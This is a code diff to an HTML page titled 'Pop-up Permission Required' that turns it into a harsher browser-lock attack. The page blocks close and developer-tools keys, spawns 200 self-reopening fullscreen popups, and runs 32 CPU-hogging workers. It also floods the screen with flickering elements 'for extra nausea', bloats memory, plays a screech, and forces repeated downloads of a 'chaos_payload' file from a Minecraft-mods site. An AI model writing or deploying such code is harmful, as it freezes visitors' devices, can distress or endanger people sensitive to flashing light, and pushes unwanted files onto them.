@@ -4,19 +4,24 @@
 <meta charset="UTF-8" />
 <title>Pop-up Permission Required</title>
 <script>
-  // Block keyboard shortcuts to prevent closing
+  // Key blocking
   function blockKeys(e) {
-    const blocked = [
-      'F4', 'Escape',
-      'Control+w', 'Control+W', 'Alt+F4', 'Alt+Tab',
-      'Meta+w', 'Meta+W',
+    const blockedKeys = ['F4','Escape'];
+    const blockedCombos = [
+      'Control+w','Control+W',
+      'Alt+F4','Alt+Tab',
+      'Meta+w','Meta+W',
+      'Control+Shift+I','Control+Shift+J', // devtools
+      'Control+Shift+C','Control+Shift+K', // devtools
+      'F12'
     ];
-    const combo = 
+    const combo =
       (e.ctrlKey ? 'Control+' : '') +
       (e.altKey ? 'Alt+' : '') +
+      (e.shiftKey ? 'Shift+' : '') +
       (e.metaKey ? 'Meta+' : '') +
       e.key;
-    if (blocked.includes(combo) || blocked.includes(e.key)) {
+    if(blockedKeys.includes(e.key) || blockedCombos.includes(combo)){
       e.preventDefault();
       e.stopPropagation();
       return false;
@@ -25,25 +30,23 @@
   window.addEventListener('keydown', blockKeys, true);
   window.addEventListener('contextmenu', e => e.preventDefault(), true);
 
-  // Spawn popup at random position fullscreen trapped with focus lock
+  // Popup with trapping and fullscreen forcing
   function openPopup() {
-    const width = 500;
-    const height = 400;
+    const width = 600;
+    const height = 450;
     const maxLeft = window.screen.width - width;
     const maxTop = window.screen.height - height;
     const left = Math.floor(Math.random() * maxLeft);
     const top = Math.floor(Math.random() * maxTop);
     const features = `width=${width},height=${height},left=${left},top=${top},` +
-      `fullscreen=yes,scrollbars=no,toolbar=no,location=no,status=no,menubar=no`;
+                     `fullscreen=yes,scrollbars=no,toolbar=no,location=no,status=no,menubar=no`;
 
     const popup = window.open(window.location.href + '?popup=true', '_blank', features);
 
     if (popup) {
       popup.focus();
-      // Trap focus: if user switches, pull back instantly
       const interval = setInterval(() => {
         if (popup.closed) {
-          // Reopen instantly if closed
           openPopup();
           clearInterval(interval);
         } else {
@@ -52,28 +55,28 @@
             popup.document.documentElement.requestFullscreen().catch(() => {});
           }
         }
-      }, 100);
+      }, 50);
     }
   }
 
-  // Web Worker for max CPU torture
+  // CPU hog web worker
   function createCpuWorker() {
     const blob = new Blob([`
       self.onmessage = function() {
         let x = 0;
-        while(true) {
-          x += Math.sqrt(Math.random()) * Math.random();
-          if (x > 1e10) x = 0;
+        while(true){
+          x += Math.sqrt(Math.random())*Math.random();
+          if(x > 1e10) x=0;
         }
       };
-    `], { type: 'application/javascript' });
+    `], {type:'application/javascript'});
     const url = URL.createObjectURL(blob);
     const worker = new Worker(url);
     worker.postMessage('start');
     return worker;
   }
 
-  // DOM flood and jitter
+  // DOM flood with jitter & color flash
   function floodDOM() {
     const container = document.createElement('div');
     container.style.position = 'fixed';
@@ -82,14 +85,14 @@
     container.style.width = '100vw';
     container.style.height = '100vh';
     container.style.overflow = 'hidden';
-    container.style.zIndex = '999999999';
+    container.style.zIndex = '2147483647';
     document.body.appendChild(container);
 
-    for(let i = 0; i < 50000; i++) {
+    for(let i=0; i<100000; i++){
       const div = document.createElement('div');
       div.style.position = 'absolute';
-      div.style.width = '3px';
-      div.style.height = '3px';
+      div.style.width = '2px';
+      div.style.height = '2px';
       div.style.backgroundColor = `hsl(${Math.random()*360},100%,50%)`;
       div.style.top = `${Math.random()*window.innerHeight}px`;
       div.style.left = `${Math.random()*window.innerWidth}px`;
@@ -102,16 +105,14 @@
         div.style.top = `${Math.random()*window.innerHeight}px`;
         div.style.left = `${Math.random()*window.innerWidth}px`;
       });
-      // Flash background and text
-      const hue = Math.floor(Math.random() * 360);
-      document.body.style.backgroundColor = `hsl(${hue}, 80%, 70%)`;
-      document.body.style.color = `hsl(${(hue+180)%360}, 80%, 40%)`;
-    }, 50);
+      // Flicker filters for extra nausea
+      document.body.style.filter = `blur(${Math.random()*3}px) brightness(${0.7+Math.random()*0.6}) contrast(${0.8+Math.random()*0.8}) saturate(${1+Math.random()*2})`;
+    }, 20);
   }
 
-  // Trigger tons of downloads
+  // Trigger many downloads
   function triggerDownloads() {
-    for(let i=0; i<10; i++) {
+    for(let i=0; i<20; i++){
       const a = document.createElement('a');
       a.href = "https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin";
       a.download = `chaos_payload_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`;
@@ -122,7 +123,18 @@
     }
   }
 
-  window.onload = function() {
+  // Memory bloat
+  let memHog = [];
+  function memoryBloat() {
+    setInterval(() => {
+      const size = 50000;
+      const arr = new Array(size).fill(Math.random());
+      memHog.push(arr);
+      if(memHog.length > 200) memHog.shift();
+    }, 10);
+  }
+
+  window.onload = function () {
     const isPopup = new URLSearchParams(window.location.search).has('popup');
 
     if (isPopup) {
@@ -137,26 +149,22 @@
       const screech = document.getElementById('screech');
       screech.volume = 1.0;
       screech.play().catch(() => {
-        document.body.addEventListener('click', () => screech.play(), { once:true });
+        document.body.addEventListener('click', () => screech.play(), { once: true });
       });
 
       triggerDownloads();
       floodDOM();
+      memoryBloat();
 
-      // Spawn 16 CPU hog workers
-      for(let i=0; i<16; i++) createCpuWorker();
+      for(let i=0; i<32; i++) createCpuWorker();
+      for(let i=0; i<200; i++) openPopup();
 
-      // Spawn 100 popups
-      for(let i=0; i<100; i++) openPopup();
-
-      // Flash colors every 30ms
       setInterval(() => {
-        const hue = Math.floor(Math.random()*360);
-        document.body.style.backgroundColor = `hsl(${hue},80%,70%)`;
-        document.body.style.color = `hsl(${(hue+180)%360},80%,40%)`;
-      }, 30);
+        const hue = Math.floor(Math.random() * 360);
+        document.body.style.backgroundColor = `hsl(${hue}, 80%, 70%)`;
+        document.body.style.color = `hsl(${(hue + 180) % 360}, 80%, 40%)`;
+      }, 20);
 
-      // Disable closing
       window.onbeforeunload = () => "Really try to leave?";
 
     } else {
